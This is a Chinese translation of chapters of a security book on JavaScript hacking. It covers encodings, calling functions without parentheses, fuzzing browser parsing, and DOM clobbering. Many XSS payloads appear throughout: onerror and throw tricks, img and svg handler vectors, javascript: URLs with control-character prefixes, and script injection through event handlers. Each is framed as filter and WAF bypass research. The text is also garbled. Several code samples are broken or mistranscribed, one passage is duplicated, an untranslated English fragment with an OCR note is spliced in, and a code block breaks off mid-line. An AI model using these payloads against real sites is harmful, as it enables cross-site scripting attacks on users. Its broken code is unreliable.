
# 黑客的 JavaScript：学习像黑客一样思考

此书可以在`http://leanpub.com/javascripthackers`购买

此版本发布于 2022-12-22

## 推特此书！

请在 Twitter 上分享此这本书来帮助 Gareth Heyes！

此书的建议推文为：

`I've just bought #javascriptforhackers by @garethheyes`

此书的建议标签为`#javascriptforhackers`。

点击此链接在 Twitter 上搜索此标签，了解其他人对这本书的评价：

`#javascriptforhackers`

> 献给我的家人，没有他们我一无所有。没有家人的爱和支持，我无法完成。

# 第一章 - 引言

JavaScript 是我的热情所在，我对那些帮助我进一步理解的方法着迷。你经常看到我推特关于不带括号调用函数、疯狂的应用方法。我试图通过"黑进"我的大脑来让这些向量变得重要。你多久发现自己读一本书或特定文章却无法记入？通过寻找"黑进"的方法，你正在学习一项特性，并将该知识应用于实现目标，无论目标是什么，只要你有目标，它就会帮助你记住。

这类技术实际上可以应用于任何事情，而且基本上是常识。以运动为例，你仅仅通过阅读是无法变得更好的，你必须通过应用知识、实践和实际进行运动来训练。JS 黑客攻击很像这样，在一天中你没有可能工作中用到 JS 的每一个特性，但如果你尝试去"黑进"它，你就可以选择想要学习的特性。这真的是我的哲学，也是这本书的重点。我将尝试教你如何遵循它并以快速速度学习，同时享受你所做的事情。

## 环境

为了遵循这一过程，你需要一个快速的环境来进行测试。这意味着你需要一个可以执行代码并立即获得结果的东西。这可以是很多：浏览器控制台、本地 Web 服务器或像 JS Fiddle 这样的 Web 应用程序。我个人决定编写自己的名为"Hackvector"的 Web 应用，赋予它评估代码、检查对象、编写 HTML 的功能，但其他选项也可以。我只是想要更多功能并确保你的输入不会被记录在某处。

## 设定目标

一旦你准备好了环境，下一步是设定目标。如果你没有目标，可能会面对空白页面发呆而毫无进展。

尝试一些事情，而且它也可以很灵活。例如，我的目标之一是"不带括号执行 JavaScript"。如果你设定了一个良好的目标，它几乎永远不会结束，而且良好的目标也会变成另一个目标，比如我之前提到的目标演变成了"不带括号执行 JavaScript 函数并传递参数"。现在你可以看到这两个目标是有有用的，因为你现在清楚了要做什么，并使用 JavaScript 的特性性来实现该目标。在上面，第二个目标比第一个更具挑战性，但第二个目标能让你获得实现更困难目标所需的知识。

## 模糊测试 (Fuzzing)

模糊测试是 JavaScript 黑客工具箱中最重要的工具之一，它让你通过让计算机报告结果来快速回答问题并发现新事物。模糊测试简单来说就是编写代码来枚举字符、代码或数据，以寻找异常。在二进制漏洞中，你会使用模糊测试来寻找 DoS 或可利用的崩溃，因为黑客的目标是通过回答问题来实现你的目标。例如，我自己设定过一个目标是理解哪些字符被允许作为空白符，你可能会奇怪为什么不直接看规范？在尝试发现浏览器行为时，你不应该将规范作为唯一的信息来源，因为浏览器有时并不遵循规范，这可能是因为它们犯了错，或者仅仅出于向后兼容等原因选择不遵守。

使用模糊测试是发现这些有趣边界情况的重要工具。你可能会奇怪为什么这些边界情况很重要，在我提供的空白符示例中，我正在编写一个 JavaScript 解析器，事实证明在解析 JavaScript 时这非常重要，并可能导致沙箱绕过。通过确保我根据浏览器的行为正确处理空白符，可以确保我的沙箱是安全的。在书的后面，我将向你展示如何使用模糊测试来回答问题并发现有趣的行为。

## 坚持与运气

JavaScript 黑客攻击与安全研究非常相似，因为发现有趣的行为需要大量的坚持和运气。诚然，知识很重要，但坚持能让你扩展知识并获得运气。如果你刚开始学习 JavaScript 还没有多少知识，只要你有足够的坚持，遵循本书的原则可以帮助你快速获取知识。如果你发现自己面对空白屏幕却不知道该做什么，请尝试一个新目标或简化你的目标，这样你就可以继续前进。不要害怕尝试你认为可能不起作用的事情，只要你坚持，时间就不会被浪费，因为在寻找发现的过程中，你学到了很多小细节。记住，坚持并不意味着一直死磕同一件事，你可以在几个月后回来尝试不同的技术。

## 社交媒体

我在进行 JS 黑客攻击时经常使用 Twitter。它很有用，因为你可以对你的技术获得实时的反馈（无论是正面还是负面的）。随着粉丝增加，你会发现其他喜欢同样事物的人，你会发现他们指出了你忽略的变体或其他细节。这很棒，因为不仅是你自己在学习，所有进行交流的人都在学习。想象如果每个人都采取这种方法，每个人都会以极快的速度学习，我们将发现一些非常有趣的 JavaScript 行为。当我把所有东西都存在脑子里时，如果我忘了，始终可以搜索 Twitter 或下载我的推文来寻找特定的技术。但重要的一点是 Twitter 不适合长期存储数据，如果你发现了一些特别自豪的东西，最好写一篇博客文章并在推文中发布链接。

## 基础知识

在本节中，我将介绍 JavaScript 黑客攻击的基础知识，为你处理其他章节提供基础。如果你是经验丰富的开发者或 JS 黑客，请随时跳过这一节。如果你想学习更多关于 JavaScript 的知识，请关注我。JavaScript 支持多种编码类型，你有十六进制、八进制和两种 Unicode 编码。

### 十六进制

首先我们将处理十六进制编码，它只在字符串内有效，如果你尝试将它们用作标识符，它们将会失败。十六进制使用 16 进制，且转义字符以`x`为前。这里是一些示例：

```javascript
\x61'//a
\x61"//a
\x61"//a

function a(){
\x61()//fails
```

在上面的示例中，你可以看到前三个在字符串内部是正确的，但最后一个示例无法调用函数，因为那里不允许使用十六进制转义。另一个有趣的方面是，十六进制转义必须使用小写的`x`，如果你使用大写的`X`，它不会被视为十六进制转义，JavaScript 引擎将仅仅把字符串处理为字面量 X 加上你指定的字符。

### Unicode

Unicode 转义也 Map字符串中有效，但也允许在标识符中使用。Unicode 转义有两种形式：前者的`(u)`和后者的`(U)`。前者允许你产生 0000-FFFF 范围内的字符，后者允许你指定代码点。

```javascript
\u61'//a
\u61"//a
\u61"//a

function a(){
\u61()//fails
```

在上面的示例中，你可以看到前三个在字符串内部是正确的，但最后一个示例无法调用函数，因为那里不允许使用十六进制转义。另一个有趣的方面是，十六进制转义必须使用小写的`x`（此处原文误写为 hex escapes，但上下文逻辑一致）。*注：此处原文可能误用了 hex 描述的描述，翻译保持原样*。

### 八进制

八进制转义使用 8 进制，且只能在字符串中使用。它没有前缀，例如：

```javascript
\061'//a
\061"//a
\061"//a

function a(){
\061()//fails
```

### Eval 和转义

现在你已经知道了可用的不同转义字符，可以使用它们配合`eval`或其他形式的`eval`（如`setTimeout`）。在这些函数使用它们时，你必须进行双重转义，因为`eval`作用于字符串，它会尝试解码传递给它的输入，当 JavaScript 实际执行字符串时，这允许我们打破之前定义的某些规则。例如，记得十六进制只能用于字符串吗？很好，如果你使用`eval`，十六进制会先被解码然后执行，这意味着以下内容是有效的：

```javascript
eval('\x61=123') // 123
```

你也可以对 Unicode 转义做同样的操作，因为它们允许在标识符中使用，你可以对它们进行双重转义：

```javascript
eval('\\u0061=123') // \u0061 = 123
//a = 123
```

如上面的示例所示，你可以转义字符串内部的反斜杠，产生 Unicode 转义，然后将其作为标识符。Unicode 转义实际上等同于`a=123`。在使用`eval`时转义 escape 的任何部分，当然也可以混合使用编码。这在不变得过于复杂和混淆的情况下很难进行说明。我将分部分演示：

```javascript
eval('\\u0061=123') // 使用 Unicode 转义进行 "a" 赋值
eval('\\x30061=123') // 十六进制编码第一个零
eval('\\u30066=123') // 八进制编码 6
```

### 字符串

字符串有三种形式，你有单引号字符串、双引号字符串和模板字符串。正如转义节中提到的，你可以在所有类型的字符串中使用多种编码。此外，你还可以使用单字符转义序列：

- `\b` // 退格
- `\f` // 进页符
- `\n` // 换行
- `\r` // 回车
- `\t` // 制表符
- `\0` // 空字符
- `\'` // 单引号
- `\"` // 双引号
- `\\` // 反斜杠

你也可以转义任何不是转义序列一部分的字符，它们会被视为实际字符处理，例如：

> `"H\E\L\O"`//HELLO

有趣的是，你可以在行尾使用反斜杠来将其延续到下一行：

```
'我继续 \
延续到下一行\
```

这种行为也适用于对象的属性名：

```javascript
let foo = {
  'bar\'
  : "baz"
}
```

双引号和单引号字符串不支持多行，除非你使用`\`来延续下一行；而模板字符串（template strings）支持多行以及这种延续行为。可以通过以下代码证明这一点：

```javascript
x = 'a\
b\';
c\';
x==='abc'//true

x = `a\nb\nc`;`;
x==='abc'//false
```

如你所示，第一个代码片段证明了模板字符串中存在延续行为，换行符并没有被添加到字符串中。第二个片段显示模板字符串支持换行，并且它们会被包含在字符串中。模板字符串有一个特性，允许你在占位符中执行任意 JavaScript 表达式，占位符定义为`${}`，你的表达式放在花括号内：

```javascript
`${7*}`//49
```

惊讶的是，模板字符串的占位符内支持任何 JavaScript 表达式！这意味着你可以在模板字符串嵌套模板字符串，这会导致看起来非常诡异但完全有效的 JavaScript：

```javascript
`${${${7*}}}`//49
```

想象一下为这个编写一个解析器吧！我佩服 V8、JavaScript Core 和 Spidermon，因为现在的 JavaScript 如此复杂，需要巧妙的解析才能正确处理。无论如何，你可以使用标签模板字符串（tagged template strings）调用函数。你只需定义一个返回要调用函数的函数或表达式，并在其后使用反引号来调用该函数：

```javascript
alert`1337`调用带有参数 1337 的 alert 函数
```

如提到的，它也支持表达式，因此你仍然可以拥有调用多个函数的诡异 JavaScript。让我们更上一层楼并演示这一点。如果你有一个返回自身的函数，你就可以有无限数量的反引号：

```javascript
function x(){return x}
```

这看起来像是一个错误，但上述代码将在任何支持标签模板字符串的 JavaScript 引擎中执行。该函数被调用一次并返回它自身，由于它是一个函数，因此允许另一个模板字符串，依此类推。

### Call 和 apply

`call`是每个函数的属性，允许你调用该函数并在第一个参数中更改函数的"this 值"，而随后的任何参数都会传递给该函数。例如：

```javascript
function x(){
  console.log(this.bar);//baz
}
let foo={bar:"baz"};
x.call(foo);
```

在上面的示例中，我们使用对象`foo`作为函数`x`的`this`值并将其传递给`call`函数，`x`函数的`this`现在指向了我们的`foo`对象，`bar`属性返回"baz"。当调用`x`函数时没有参数，如果你想向函数传递参数，只需像这样将它们添加到`call`函数中即可：

```javascript
function x() {
  console.log(arguments[0]);//1
  console.log(arguments[1]);//2
  console.log(this);////object Window
}
x.call(null, 1, 2);
```

如果你不在`call`函数中提供"this"值，在非严格模式下它将使用`window`对象，因为我们在`call`函数的第一个参数中使用了`null`，由于我们不在严格模式下，`this`将将默认为`window`对象。如果你使用`"use strict"`指令，`this`将是`null`而不是`window`：

```javascript
function x() {
  "use strict";
  console.log(arguments[0]);//1
  console.log(arguments[1]);//2
  console.log(this);////null
}
x.call(null, 1, 2);
```

`apply`函数与`call`函数完全相同，唯一的区别在于你可以在第二个参数中传递一个参数数组：

```javascript
function x() {
  console.log(arguments[0]);//1
  console.log(arguments[1]);//2
}
x.apply(null, [1, 2]);
```

## 总结

# 第二章 - 无括号的 JavaScript

```
onerror=eval;

throw='alert\x281\x29';
```

One thing to think is that the throw statement is a statement which means it can't be used as an expression, you can't instance it in a function call:

```
alert('throw'test');//This will fail
```

When you have to be aware how you use it and if you want to bypass a WAF (Web Application Firewall) need to know what characters are being blocked. Let's set a small sub-goal here: how we can use the throw statement with block statements? Note "var" wasn't block scoped but using `let` allows us.

> The source seems broken — possibly due OCR issues into newlines

```javascript
'a'.replace a${alert}``calls alert with a,
```

这有点奇怪。我们需要那个逗号，因为数组会被转换为字符串。我们该如何得到它呢？一种方法是使用`call`来改变"this"值，这意味着我们可以控制匹配参数（match argument），并使用正则表达式来匹配任何字符：

```javascript
'a'.replace.call1$(./){alert}``calls alert with 1
```

在`replace`函数上方发生的事情是通过`call`调用的，这会将"this"赋值为"a"标签模板字符串的匹配项。我们使用了一个正则表达式，由于使用了`call`，我们将这个正则表达式传递给`replace`函数的第一个参数，而该正则表达式匹配任何单个字符（换行符除外），然后我们传递了`alert`函数的引用，导致`alert`被带有参数`1`被调用。呼。这简直太疯狂了！谁知道字符串可以被这样滥用？这里有一个很好的挑战是，你可以用`1337`代替`1`来调用`alert`。

你可以使用这种技术调用任何内容，并使用`Reflect`对象传递任何参数。那么，`Reflect`对象到底是什么？嗯，它允许你对任何对象执行诸如函数调用/get 操作等操作。它可以用来替代`call`，例如，它有一个自定义的`apply`方法，可以用于调用任何对象上的函数。你只需要传递函数以及你想要调用该函数的参数。正如前面提到的，它还可以用于其他操作，但现在我们先集中在`apply`上：

```javascript
Reflect.apply${alert}$(window)${[1337]}//alert is called with 1337
```

让我们来分析一下这里发生了什么：我们传递了想要调用的函数（在本例中为"alert"），向该函数传递了"this"值（在本例中为"window"），这规避了非法调用错误，最后我们传递了一个参数数组来执行函数。使用"Call"是为了避免将字符串数组作为第一个参数（如前所述）。`Reflect`方法不需要特定的"this"值，并且会乐意在任何分配给"this"的对象上执行：

我们可以对其他操作（如`set`）执行相同的操作。`Reflect`对象的方法允许你对任何对象执行 set 操作。这可以通过赋值给 location 对象来演示：

```javascript
Reflect.set.call${location}${{href}${'javascript:alert(1337)'}}
```

```javascript
//赋值 javascript url
```

`set`方法在第一个参数需要一个有效对象（在本例中为"location"），第二个参数需要一个属性，第三个参数需要一个要赋值的值。

## 实例符号 (instance symbol)

我想讨论的最后一个方法是使用`hasInstance`符号。符号（Symbols）允许你在属性键中定义一个唯一的令牌。有一些内置符号可以用于各种操作。JavaScript 以这种方式使用符号是为了避免使用与 Web 上现有代码冲突的特殊属性。"has instance"符号允许你自定义`instanceof`操作符的行为，如果你设置了此符号，它会将左操作数传递给由符号定义的函数。这提供了一种不带括号执行 JavaScript 的整洁方法：

```javascript
'alert\x28137\x29'instanceof([Symbol['hasInstance']])://calls alert(1337)
```

在下面的示例中，我们在`instanceof`操作符之前的字符串中定义了负载，并使用一个带有"hasInstance"符号的新对象字面量并赋值，然后当`instanceof`操作符带有字符串和对象运行时运行时，字符串会被传递给`eval`，`alert`函数将被调用。你可以这样使用符号，而无需使用方括号：

```javascript
'alert\x28137\x29'instanceof([Symbol.hasInstance]:eval)//calls alert(1337)
```

## 总结

这一章向你展示了如何在目标内定义目标和子目标。这让你能够以极快的速度学习各种 JavaScript 特性，并确保你不是对着空白屏幕发呆。脑中有清晰的目标有助于你关注有趣的特性，并确保你不断不断学习。在本章中，我们学习了`onerror`处理器以及如何滥用它来执行不带括号的 JavaScript，我们转向了模板字符串并揭示了使用占位符带有类型向函数传递参数的惊讶行为，最后我们涵盖了"hasInstance"符号以及如何滥用它进行 JavaScript 黑客攻击。

# 第三章 - 模糊测试 (Fuzzing)

## 真相

提到模糊测试（fuzzing）时，人们通常认为用它来发现可利用的漏洞或崩溃。当然，你可以用模糊测试做这些，我过去也发现过漏洞，但你也可以用模糊测试发现浏览器行为，这就是本章的主题。模糊测试将为你节省大量时间，并帮助你快速建立 JavaScript 知识。人们往往想查看规范作为特定 JavaScript 行为的真理来源，这是一种错误的心态，因为不同的浏览器可能有其不遵循规范的怪癖，或者它们的实现可能是错误的。我不是在说不要使用规范，我只是说不要相信它，要使用模糊测试来发现真相。

我第一次尝试行为模糊测试是寻找 JavaScript 协议中允许的字符。我开始在锚点点标签的`href`属性内部创建一个 JavaScript URL，并手动注入 HTML 实体并将悬停在链接上，看它是否仍然是 JavaScript 协议。我在想一定有更好的方法。当时执行此操作的方法是在像 PHP 之类的侧端语言中进行。因此，我构建了一个模糊测试工具，循环字符并返回结果。这是 2008 年的事，它发现了大量的有趣结果：

- `jav&#5632;script(1)`

这是一个很好的例子，说明了为什么你这样做。2008 年的计算机比现在慢得多。

## 模糊 URL (Fuzz URLs)

要做第一件事是模糊操作并获得一些有趣的结果来验证。这很容易：

```javascript
let log=[];
let anchor = document.createElement('a');
for(let i=0;i<=0xffff;i++) {
  anchor.href = `${String.fromCharCode(i)}javascript:`;
  if(anchor.protocol === 'javascript:') {
    log.push(i);
  }
}
console.log(log);
```

再次运行该代码时，我们得到了不同的结果：

- 0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31
- 32

随机选择一个代码点，让我们为它生成 DOM 并确认它是否工作：

```javascript
let anchor = document.createElement('a');
anchor.href = `${String.fromCharCode(12)}javascript:alert(1337)`;
anchor.append('Click me');
document.body.append(anchor);
```

我选择了代码点 12（form body），创建了一个调用`alert`的 JavaScript URL，向锚点添加了文本，最后将其添加到 body 元素。点击链接时它应该调用`alert`，现在你验证了你的模糊测试确实有效。通过实验不同的代码点来确保它按预期运行。要问自己的几个问题是"你能"多个字符"或"你可以在不同位置放置多个字符吗？"我把这些问题留给你们作为练习来回答。

在操作 DOM 时需要记住的一点是：当直接编辑基于 HTML 的属性时，HTML 实体不会被解码。调整`href`属性来模糊测试 HTML 实体是没有意义的。你必须使用`innerHTML`。让我们在 HTML 中尝试同一个字符，看看它是否有效：

```html
<a href="&x12;javascript:alert(1337)">Test</a><-- JavaScript 协议有效 -->
```

这种方法通常是有效的，当你看到 DOM 的结果时，你可以在 HTML 中使用实体。正如前面提到的，这里有一个例外，还记得开头的 NULL 字符吗？这在 DOM 中有效，但在 HTML 中无效：

```html
<a href="&#0;javascript:alert(1337)">Test</a><-- JavaScript 协议无效 -->>
```

上述方法不起作用，这说明了验证你的结果并在 DOM 以及`innerHTML`或 HTML 中进行测试是多么重要。你可以看到这里有很多自动化机会，使用 Puppeteer 或另一个框架可能是验证结果的好主意，而不是每次都手动操作。

## 模糊测试 HTTP URL

对 HTTP URL 进行模糊测试也是可能的，但不是协议，而是可以使用主机名来判断是否成功。你可以创建一个`for`循环来遍历 Unicode 代码点，并将字符注入到"href"中，检查主机名是否匹配预期值。

```javascript
a=document.createElement('a');
log=[];
for(let i=0;i<=0xffffffff;i++) {
  a.href = `${String.fromCharCode(i)}https://garethheyes.co.uk`;
  if(a.hostname === 'garethheyes.co.uk') {
    log.push(i);
  }
}
console.log(log);
//0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,
31,32
```

上面的代码显示 HTTP URL 支持的字符与 JavaScript URL 开头的字符完全相同。注意，NULL 字符在 DOM 中支持但在 HTML 上下文中不支持。

为了寻找在漏洞链中可能很有用的客户端重定向，你可能想模糊测试协议相对 URL。在某些情况下，协议相对 URL 允许你通过双斜杠引用外部 URL。它们会继承页面的协议，例如如果页面使用的是 HTTPS://，那么协议相对 URL 就会使用该协议。让我们模糊斜杠内部，看看哪些字符是被支持的：

```javascript
a=Document.createElement('a');
log([]);
for(let i=0;i<=0xffffffff;i++) {
  a.href = `${String.fromCodePoint(i)}garethheyes.co.uk`;
  if(a.hostname === 'garethheyes.co.uk') {
    log.push(i);
  }
}
input.value=log//9,10,13,47,92
```

你可以看到，你可以在斜杠之间放置空白字符，此外反斜杠字符也可以像正斜杠一样使用。

## 模糊测试 HTML

我们已经看到了如何模糊测试 JavaScript URL，在模糊测试 HTML 时也可以采取相同的方法。通过使用`innerHTML`API，我们可以像处理 DOM 属性一样极快地发现特性（quirks）。在开始之前，最好在脑中设定一个问题作为模糊测试的目标。例如，我问了自己："HTML 注释结束标记允许哪些字符？"为了回答这个问题，让我们思考如何实现它：如果 HTML 注释被关闭了，我们可以检查注释后的后续标签，使用`querySelector`API 检查该 HTML 元素是否被渲染。实现方法如下：

```javascript
let log=[];
let div = document.createElement('div');
for(let i=0;i<=0xffffffff;i++) {
div.innerHTML=`<!--${String.fromCodePoint(i)}<span</span>-->`;
if(div.querySelector('span')) {
  log.push(i);
}
}
console.log(log)//33,45,62
```

这与 DOM 属性模糊测试非常相似，你可能会注意到它需要更长的时间，因为浏览器必须做更多工作。我们创建一个`div`元素，再次遍历所有的 Unicode 代码点，但这次使用`innerHTML`创建一个 HTML 注释，在结束大于号`>`之前注入我们的 Unicode 字符。如果注释被关闭，后续的`span`将不会被渲染，因此`span`的`querySelector`将为`null`。我们想知道当找到`span`时注释是否生效了。我们在 Chrome 上尝试了这一点，以下任何字符都能在双连字符后关闭注释：`!->`

你可以在其他浏览器上尝试这一点，并通过将占位符移动到结束注释标签的不同部分进行实验。几年前我在 Firefox 上运行过非常相似的操作，你可以发现你可以在`>`之后使用换行符！我也尝试过反过来使用`querySelector`，通过检查后续的`span`是否未渲染来判断一个起始注释是否实际生效。我使用这种验证技术发现了 Firefox 的另一个漏洞，该漏洞允许在起始注释标签的连字符中创建 NULL 字符。

```javascript
let log=[];
let div = document.createElement('div');
for(let i=0;i<=0xffffffff;i++) {
div.innerHTML=`<!--${String.fromCodePoint(i)}<span</span>-->`;
if(div.querySelector('span')) {
  log.push(i);
}
}
console.log(log)
```

上面的方法不起作用，这说明了验证你的结果并在 DOM 以及`innerHTML`或 HTML 中进行测试是多么重要。你可以看到这里有很多自动化机会，使用 Puppeteer 或另一个框架可能是验证结果的好主意，而不是每次都手动操作。

你可以将上述逻辑应用于单行注释的模糊测试，与其将占位符放在随机字符串的两端，可以将它们放在前面进行检测。接下来，让我们寻找单行注释：

```javascript
log=[];
for(let i=0;i<0xffff;i++){
  try {
    eval(`${String.fromCodePoint(i,i)}%$l234$`)
    log.push(i);
  } catch(e){}}
}
console.log(log);//47
```

我们如预期地检测到了正斜杠。你可以看到，构造模糊向量来发现有趣的行为确实是一项真正的技能。我们需要考虑模糊向量如何执行以及在什么上下文中执行，以避免误报。

最后，在本章中，我们将介绍嵌套模糊测试，以发现一种你可能不知道的 JavaScript 注释行为。嵌套模糊测试很复杂，因为它涉及到更多字符，而且目前现代浏览器还没有强大到可以执行多个码点大于 0xff 的`for`循环。然而，如果我们减少测试的码点数量，就能发现一些有趣的东西。

```javascript
log=[];
for(let i=0;i<=0xff;i++){
  for(let j=0;j<=0xff;j++){
    try {
      eval(`${String.fromCodePoint(i,j)}%$l234$`)
      log.push([i,j]);
    } catch(e){}
  }
}
console.log(log);//[35, 47]
```

这次我们使用了嵌套循环，出于性能考虑，我们必须限制字符的数量。然后，我使用`fromCodePoint`方法在每个循环中从一个码点添加两个字符，并在注释后添加了一些垃圾字符以证明注释发生了。我们得到了包含两个字符的数组，因为产生注释需要这两个字符。我们得到了预期的双正斜杠，但这是什么？35 和 33 是"#!"，只要它们位于执行的 JavaScript 的开头，就会充当单行注释。你可以通过尝试执行带有注释的`alert`来验证你的结果。

```javascript
! 
alert(1337)//执行带有 1337 的 alert
```

如果你在哈希符号之前添加任何字符，它将失败：

```javascript
123 
! 
alert(@)//alert 不会被调用。
```

在示例中，如果哈希符号之前有任何字符，注释将不起作用。shebang 可能被添加为一种注释序列，是因为 JavaScript 被用 NodeJS 用作 shell 脚本，因此忽略它是一个常见情况。

## 模糊测试逃逸 (Fuzzing escapes)

在破解 JavaScript 沙箱的过程中，我尝试模糊测试不同的转义字符，例如在引言章节发现的 Unicode 转义。这导致我在各种浏览器中发现了有趣的行为。我发现 Safari 在遇到字符串中未完成的 Unicode 转义时不会抛出异常。旧版本的 Opera（Chrome 之前）在发送到`eval`时也会错误地解析 Unicode 转义。如果你足够，旧的行为可以用于沙箱逃逸——我们如何找到它们呢？当然是通过模糊测试！你必须意识到你正在测试的上下文，以及它们是否需要双编码。让我们模糊一个简单的 Unicode 转义：

```javascript
let a = 123;
log=[];
for(let i=0;i<0x10ffff;i++){
  try{
    eval(`\${String.fromCodePoint(i)}\u0061`);
    log.push(i);
  } catch(e) {}
}
console.log(log)/48
```

在代码中，我像在本章前面的那样对所有 Unicode 字符进行模糊。这次我定义了一个变量`a`来查看它是否抛出异常。如果代码尝试访问未定义的变量，`eval`将抛出异常。我们想知道`a`是否被成功访问。我们使用`\u`的 Unicode 转义格式，你必须转义反斜杠，因为我们希望`eval`解析该 Unicode 转义。在代表零的占位符中，我们得到了"48"的结果，这是零的字符码。当模糊所有字符时，我们确定这种 Unicode 格式允许通过纯模糊测试进行零填充。

你不仅可以模糊字符，还可以通过更改占位符来模糊十六进制。每个数字字面量都有一个`toString`方法，允许你指定基数（radix），可以将整数转换为 2-36 之间的指定基。十六进制使用基 16，所以我们必须传递基数 16 将其转换为十六进制：

```javascript
let a = 123;
log=[];
for(let i=0;i<=0xff;i++){
  try {
    eval(`${String.fromCodePoint(i,j)}
```

# 第四章 - 黑客的 DOM

```html
<img src onerror=event.path.pop().alert(1337)>
```

在浏览器中，我们使用标准化的`composedPath()`方法，它返回一个等同于 Chrome 中`path`属性的数组。调用`composedPath`来获取数组的最后一个元素，在每个浏览器中它都会包含`window`对象：

```html
<img src onerror=composedPath().pop().alert(1337)>
```

记得我之前说过每个处理器都处理一个带有事件对象的参数吗？对于 SVG 元素，有一个特殊情况。浏览器添加的不是"event"而是"evt"，这意味着你可以像使用`composedPath()`方法一样，通过这个参数访问`window`对象：

```html
<svg><image ref=1 onerror=evt.composedPath().pop().alert(1337)</svg>
```

为了发现这一点，我没有阅读 Chrome 的源码，而是查看了事件处理程序的代码及其定义。如果你在 Chrome 中运行这段代码，你可以看到处理函数是如何定义的：

```html
<svg><image ref=1 onerror=alert(onerror)</svg>
```

结果产生如下代码：

```javascript
function error(evt) { // event 被用 evt 引用
  alert(onerror)
}
```

所以`evt`指向事件。这在 SVG 元素上似乎是如此，但我好奇是否还有其他元素？值得花些时间看看当 JavaScript 沙箱保护你免于访问事件对象时，这些元素是否还有用。

为了完成这部分，我将介绍错误对象（error object）以及如何准备`prepareStackTrace`来在 Chrome 中获取`window`对象。使用`prepareStackTrace`回调，你可以自定义堆栈跟踪（stack traces），这对于开发者来说非常方便。其思路是提供一个有两个参数的函数：一个用于错误消息，另一个用于`CallSite`对象数组。`CallSite`对象由与堆栈跟踪相关的属性和方法组成。例如，你有`isEqual`来判断当前`CallSite`是否在事件函数内部，但你真正感兴趣的是如何获取`window`对象。坦率地说，Chrome 在`CallSite`对象上为我们提供了一个非常有用的方法`getThis()`，如果执行代码没有定义"this"，它将返回一个`window`对象。让我们来看看实际效果：

```javascript
Error.prepareStackTrace=function(error, callSites) {
  callSites.shift().getThis().alert(1337);
};
Error().stack
```

我们定义了这个回调方法，该函数只需从`callSites`数组中获取第一个`CallSite`对象，调用`getThis()`函数返回`window`对象，然后我们使用它来访问并调用`alert()`函数。`prepareStackTrace`回调仅在访问`Error`的`stack`属性时才会执行。

## HTML 事件的作用域

当 JavaScript 事件在 HTML 元素上执行时，浏览器会带有该元素和`document`对象执行该函数。这意味着你可以通过指定当前对象或文档的属性来使用快捷方式，而不需要完整的属性路径。实际上，浏览器执行了以下操作：

```javascript
with(document) {
  with(element) {
    // 执行的事件
  }
}
```

记得`document`属性`defaultValue`吗，我们实际上可以在我们的元素事件中使用它。所以你只需要使用该属性就可以访问`window`对象：

```html
<img src onerror=default.alert(1337)>
```

这之所以有效是因为上述的`with`语句。浏览器执行事件并在图像上查找`defaultValue`属性，没找到，于是它会检查`document`对象，如果存在，则会访问并返回`document.defaultValue`属性。如果你枚举`document`对象，就可以看到哪些属性是可选。你可以使用自定义枚举器，或者简单地在浏览器控制中使用`console.dir(document)`。

由于事件的作用域，你也可以使用其他 DOM 函数，在这里我们可以创建一个脚本，并使用完整路径将其添加到文档中：

```html
<img src onerror="s=createElement('script');s.append('alert(1337)');document.appendChild(s)">
```

注意在此例中使用了`appendChild()`，如果你不指定完整路径，`append`将抛出异常（至少在 Chrome 中是这样）。`append()`函数接受字符串或节点。`append()`函数实际上会在`image`对象上执行，但由于`document`优先级更高，脚本会被添加到图像中而不是文档中。

## DOM 覆盖 (DOM clobbering)

DOM 覆盖是一种利用编码模式的技巧，该模式会检查全局变量，如果不存在则允许不同的代码路径。其思路是你用一个 DOM 元素（最常见的是锚点元素`<a>`）覆盖掉那个不存在的全局变量。假设你有像这样的代码：

```javascript
let url = window.currentUrl || 'http://example.com';
```

这段代码乍看起来无害，但实际上`window.currentUrl`不仅可以全局变量，也可以是一个 DOM 元素。在网页设计的早期，网站常用表单的`id`属性来引用功能元素，这是 Internet Explorer 和 Netscape 的一项特性，允许表单的`id`或`name`属性成为开发者快捷使用的全局变量。这使得 DOM 覆盖成为可能。你可能见过像这样的代码：

```html
<form id="searchForm</form>
<script>
  searchForm.submit();
</script>
```

浏览器会创建一个名为"searchForm"的全局变量并允许你在无需使用`getElementById`方法的情况下引用该表单。此外，你可以使用"name"属性来实现相同的功能，有一个重要的区别是在使用"name"属性时。

锚点元素让 DOM 覆盖变得更有趣，因为它们允许你使用元素的"href"属性。在尝试 DOM 覆盖需要需要的一点是，你只能获取 HTML 属性的值。例如，你不能获取"x.notAttribute"，但"x.title"是可以的。

```html
<a id=x>
<a id=x name=y href=clobbered:1>
<a id=x name=y href=clobbered:2>

<script>
alert(x[2])//clobbered:2
</script>
```

上述代码创建了一个包含三个锚点（anchor）的集合，第三个锚点的索引为 2，因为要记住集合是从零开始索引的。如果我将第三个锚点的名称改为"z"，这将不起作用，因为`name`属性不会创建集合。如果你需要深度三层的覆盖（clobber），你必须使用不同的元素，例如`form`。

```html
<form id=x name=y><input id=z</form>
<form id=x</form>
<script>
alert(x.y.z)
</script>
```

然而，存在一个问题：如前提到的，你无法控制锚点以外元素的元素的`toString`方法，因此在这种情况下"z"将等于"object HTMLElement"。为了覆盖深度三层以上的属性，你必须使用既是有效的 HTML 属性又是有效的 DOM 属性：

```html
<form id=x name=y><input id=z value=1337</form>
<form id=x</form>
<script>
alert(x.y.value)//1337
</script>
```

这个规则有一个例外，就是使用`iframe`。通过`iframe`，你可以使用`srcdoc`和`name`属性。发生的是`iframe`的窗口具有被覆盖的值，这意味着你可以将`iframe`和其他元素链起来，以覆盖任意深度。唯一的缺点是`iframe`可能会被 HTML 过滤器拦截。

通过一个例子可以完美说明。首先我们创建一个`iframe`并使用`srcdoc`属性在`iframe`内部创建一个元素：

```html
<iframe name=foo srcdoc="<a id=bar href=clobbered:1337</a></iframe>
<script>
alert(foo)/[object Window]
alert(foo.bar)/undefined
</script>
```

上面的示例显示"foo"被覆盖了，但它是被`iframe`的窗口对象覆盖的，而同源允许我们通过`iframe`内部进行进一步覆盖。但为什么"foo.bar"是`undefined`呢？因为`iframe srcdoc`需要一些时间来渲染，没有足够的时间来渲染框架的内容以及另一个元素的属性。幸运的是，我发现了一个绕过方法，如果你引入一个跨源样式导入，会为`iframe`内部元素的渲染创建覆盖延迟：

```html
<iframe name=foo srcdoc="<a id=bar href=clobbered:1337</a></iframe>
<style>
@import 'https://garetheyes.co.uk';
